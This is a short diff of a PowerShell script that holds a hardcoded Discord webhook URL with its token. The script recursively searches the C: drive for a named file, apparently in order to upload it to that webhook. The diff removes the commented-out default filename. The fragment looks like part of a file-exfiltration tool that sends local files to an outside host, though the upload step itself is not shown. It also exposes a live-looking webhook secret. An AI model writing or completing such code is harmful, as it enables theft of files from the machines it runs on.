@@ -1,9 +1,6 @@
 # Discord webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1149830168903438358/9Doq-cehv0fkinqLVAg3wrGdtpNqCs0j8rM_OEuh1PQn6B8EstGbTZF8QGwsyT4sqVxS"
 
-# File name to search for
-# $fileNameToSearch = "testingtetsing.txt"
-
 try {
     # Search for the file in the C drive
     $fileToUpload = Get-ChildItem -Path "C:\" -Recurse -Filter $fileNameToSearch | Select-Object -First 1 -ExpandProperty FullName
